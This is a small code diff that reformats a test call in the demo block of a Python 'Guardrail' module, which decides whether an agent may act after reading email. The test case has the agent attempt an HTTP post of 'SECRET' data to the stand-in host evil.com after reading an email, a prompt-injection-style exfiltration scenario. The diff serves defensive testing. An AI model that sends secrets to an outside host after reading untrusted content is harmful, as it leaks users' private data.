@@ -67,7 +67,9 @@ if __name__ == "__main__":
     guard = Guardrail()
     guard.decide("email.read", {"id": "msg1"}, {"recent_sources": ["email"]})
     decision = guard.decide(
-        "http.post", {"url": "evil.com", "data": "SECRET"}, {"recent_sources": ["email"]}
+        "http.post",
+        {"url": "evil.com", "data": "SECRET"},
+        {"recent_sources": ["email"]},
     )
     print(f"  Result: {decision.action}")
 
